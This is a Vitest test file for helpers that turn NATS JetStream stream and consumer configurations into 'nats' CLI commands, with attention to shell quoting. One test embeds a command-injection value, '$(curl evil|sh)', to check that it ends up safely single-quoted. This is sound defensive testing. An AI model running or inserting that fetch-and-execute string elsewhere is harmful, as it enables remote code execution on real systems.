import { describe, it, expect } from 'vitest'
import type { StreamConfig, ConsumerConfig } from '@/types/nats'
import { nanosToGoDuration, streamConfigToNatsCli, consumerConfigToNatsCli } from './natsCli'

const H = 3_600_000_000_000
const S = 1_000_000_000

describe('nanosToGoDuration', () => {
  it('renders whole hours, minutes, seconds compactly', () => {
    expect(nanosToGoDuration(168 * H)).toBe('168h')
    expect(nanosToGoDuration(120 * S)).toBe('2m')
    expect(nanosToGoDuration(90 * S)).toBe('1m30s')
    expect(nanosToGoDuration(3661 * S)).toBe('1h1m1s')
  })

  it('renders fractional seconds above 1s', () => {
    expect(nanosToGoDuration(1_500_000_000)).toBe('1.5s')
  })

  it('renders sub-second durations with the right unit', () => {
    expect(nanosToGoDuration(500_000_000)).toBe('500ms')
    expect(nanosToGoDuration(2_000_000)).toBe('2ms')
    expect(nanosToGoDuration(500_000)).toBe('500us')
    expect(nanosToGoDuration(42)).toBe('42ns')
  })

  it('renders non-positive as 0s', () => {
    expect(nanosToGoDuration(0)).toBe('0s')
    expect(nanosToGoDuration(-5)).toBe('0s')
  })
})

function streamCfg(over: Partial<StreamConfig> = {}): StreamConfig {
  return {
    retention: 'limits',
    max_msgs: -1,
    max_bytes: -1,
    max_age: 0,
    storage: 'file',
    num_replicas: 1,
    duplicate_window: 120 * S,
    ...over,
  }
}

describe('streamConfigToNatsCli', () => {
  it('maps a basic limits/file stream', () => {
    const cmd = streamConfigToNatsCli({
      name: 'ORDERS',
      subjects: ['orders.*', 'orders.>'],
      config: streamCfg({ max_msgs: 10000, max_msg_size: 1024 }),
    })
    expect(cmd).toBe(
      "nats stream add ORDERS --subjects='orders.*,orders.>' --retention=limits --storage=file " +
        '--replicas=1 --max-msgs=10000 --max-bytes=-1 --max-msg-size=1024 --max-age=-1 --dupe-window=2m',
    )
  })

  it('single-quotes KV/object subjects so the shell does not expand $KV. / $O.', () => {
    const cmd = streamConfigToNatsCli({
      name: 'KV_store',
      subjects: ['$KV.store.>', '$O.bucket.>'],
      config: streamCfg(),
    })
    expect(cmd).toContain("--subjects='$KV.store.>,$O.bucket.>'")
    expect(cmd).not.toContain('--subjects="')
  })

  it('emits --no-allow-direct when allow_direct is false', () => {
    const cmd = streamConfigToNatsCli({ name: 'S', subjects: ['s'], config: streamCfg({ allow_direct: false }) })
    expect(cmd).toContain('--no-allow-direct')
    expect(cmd).not.toContain(' --allow-direct')
  })

  it('omits --dupe-window when duplicate_window is absent', () => {
    const cmd = streamConfigToNatsCli({ name: 'S', subjects: ['s'], config: streamCfg({ duplicate_window: undefined }) })
    expect(cmd).not.toContain('--dupe-window')
  })

  it('maps workqueue retention to "work" and memory storage', () => {
    const cmd = streamConfigToNatsCli({
      name: 'JOBS',
      subjects: ['jobs.>'],
      config: streamCfg({ retention: 'workqueue', storage: 'memory', num_replicas: 3 }),
    })
    expect(cmd).toContain('--retention=work')
    expect(cmd).toContain('--storage=memory')
    expect(cmd).toContain('--replicas=3')
  })

  it('renders max-age as a Go duration when set', () => {
    const cmd = streamConfigToNatsCli({
      name: 'S',
      subjects: ['s'],
      config: streamCfg({ max_age: 168 * H }),
    })
    expect(cmd).toContain('--max-age=168h')
  })

  it('includes optional toggles only when non-default', () => {
    const cmd = streamConfigToNatsCli({
      name: 'S',
      subjects: ['s'],
      config: streamCfg({
        discard: 'new',
        compression: 's2',
        deny_delete: true,
        deny_purge: true,
        allow_rollup_hdrs: true,
        allow_direct: true,
        max_consumers: 5,
        max_msgs_per_subject: 100,
      }),
    })
    expect(cmd).toContain('--discard=new')
    expect(cmd).toContain('--compression=s2')
    expect(cmd).toContain('--deny-delete')
    expect(cmd).toContain('--deny-purge')
    expect(cmd).toContain('--allow-rollup')
    expect(cmd).toContain('--allow-direct')
    expect(cmd).toContain('--max-consumers=5')
    expect(cmd).toContain('--max-msgs-per-subject=100')
  })

  it('omits default toggles and compression=none', () => {
    const cmd = streamConfigToNatsCli({ name: 'S', subjects: ['s'], config: streamCfg({ compression: 'none' }) })
    expect(cmd).not.toContain('--deny-delete')
    expect(cmd).not.toContain('--deny-purge')
    expect(cmd).not.toContain('--allow-rollup')
    expect(cmd).not.toContain('--compression')
    expect(cmd).not.toContain('--max-consumers')
    expect(cmd).not.toContain('--max-msgs-per-subject')
  })

  it('appends a NOTE for exotic features it cannot reproduce', () => {
    const cmd = streamConfigToNatsCli({
      name: 'MIRROR_S',
      subjects: [],
      config: streamCfg({
        mirror: { name: 'SOURCE' },
        republish: { src: 'a.>', dest: 'b.>' },
        subject_transform: { src: 'a.>', dest: 'c.>' },
        consumer_limits: { max_ack_pending: 100 },
        metadata: { team: 'platform' },
      }),
    })
    expect(cmd).toContain('# NOTE: omitted')
    expect(cmd).toContain('mirror')
    expect(cmd).toContain('republish')
    expect(cmd).toContain('subject_transform')
    expect(cmd).toContain('consumer_limits')
    expect(cmd).toContain('metadata')
  })

  it('does not append a NOTE when nothing is dropped', () => {
    expect(streamConfigToNatsCli({ name: 'S', subjects: ['s'], config: streamCfg() })).not.toContain('# NOTE')
  })
})

describe('consumerConfigToNatsCli', () => {
  it('maps an explicit-ack pull consumer with a single filter', () => {
    const cfg: ConsumerConfig = {
      durable_name: 'worker',
      deliver_policy: 'all',
      ack_policy: 'explicit',
      ack_wait: 30 * S,
      max_deliver: 5,
      replay_policy: 'instant',
      filter_subject: 'orders.eu',
      max_ack_pending: 1000,
    }
    const cmd = consumerConfigToNatsCli('worker', 'ORDERS', cfg)
    expect(cmd).toBe(
      "nats consumer add ORDERS worker --filter='orders.eu' --deliver=all --ack=explicit " +
        '--wait=30s --max-deliver=5 --replay=instant --max-pending=1000 --pull',
    )
  })

  it('emits a --filter per subject for multi-filter consumers', () => {
    const cfg: ConsumerConfig = {
      deliver_policy: 'new',
      ack_policy: 'none',
      filter_subjects: ['a.1', 'a.2'],
    }
    const cmd = consumerConfigToNatsCli('multi', 'S', cfg)
    expect(cmd).toContain("--filter='a.1'")
    expect(cmd).toContain("--filter='a.2'")
    expect(cmd).toContain('--deliver=new')
    expect(cmd).toContain('--ack=none')
  })

  it('always adds --pull so the command is non-interactive', () => {
    const cmd = consumerConfigToNatsCli('c', 'S', { deliver_policy: 'all', ack_policy: 'explicit' })
    expect(cmd).toContain('--pull')
  })

  it('single-quotes a $KV.-prefixed filter subject', () => {
    const cmd = consumerConfigToNatsCli('c', 'S', { deliver_policy: 'all', filter_subject: '$KV.store.>' })
    expect(cmd).toContain("--filter='$KV.store.>'")
    expect(cmd).not.toContain('--filter="')
  })

  it('single-quotes a malicious description containing $(...) and quotes', () => {
    const cmd = consumerConfigToNatsCli('c', 'S', {
      deliver_policy: 'all',
      description: "$(curl evil|sh) 'it'",
    })
    // The whole value is single-quoted; the embedded ' is escaped via '\''.
    expect(cmd).toContain("--description='$(curl evil|sh) '\\''it'\\'''")
    expect(cmd).not.toContain('--description="')
  })

  it('strips the % suffix from --sample', () => {
    const cmd = consumerConfigToNatsCli('c', 'S', { deliver_policy: 'all', sample_freq: '100%' })
    expect(cmd).toContain('--sample=100')
    expect(cmd).not.toContain('--sample=100%')
  })

  it('maps last_per_subject to --deliver=subject', () => {
    const cmd = consumerConfigToNatsCli('c', 'S', { deliver_policy: 'last_per_subject', ack_policy: 'explicit' })
    expect(cmd).toContain('--deliver=subject')
  })

  it('maps by_start_sequence to the start sequence', () => {
    const cmd = consumerConfigToNatsCli('c', 'S', { deliver_policy: 'by_start_sequence', opt_start_seq: 42 })
    expect(cmd).toContain('--deliver=42')
  })

  it('appends a NOTE for consumer settings it cannot express as flags', () => {
    const cmd = consumerConfigToNatsCli('c', 'S', {
      deliver_policy: 'all',
      ack_policy: 'explicit',
      headers_only: true,
      inactive_threshold: 30 * S,
      mem_storage: true,
    })
    expect(cmd).toContain('# NOTE: omitted')
    expect(cmd).toContain('headers_only')
    expect(cmd).toContain('inactive_threshold')
    expect(cmd).toContain('mem_storage')
  })

  it('does not append an omission NOTE when those settings are unset', () => {
    const cmd = consumerConfigToNatsCli('c', 'S', { deliver_policy: 'all', ack_policy: 'explicit', inactive_threshold: 0 })
    expect(cmd).not.toContain('# NOTE: omitted')
  })

  it('maps by_start_time to --deliver=all and appends a NOTE (no RFC3339 flag value)', () => {
    const cmd = consumerConfigToNatsCli('c', 'S', { deliver_policy: 'by_start_time', opt_start_time: '2026-06-12T14:00:00Z' })
    expect(cmd).toContain('--deliver=all')
    expect(cmd).not.toContain('--deliver=2026-06-12T14:00:00Z')
    expect(cmd).toContain('# NOTE:')
    expect(cmd).toContain('2026-06-12T14:00:00Z')
  })
})
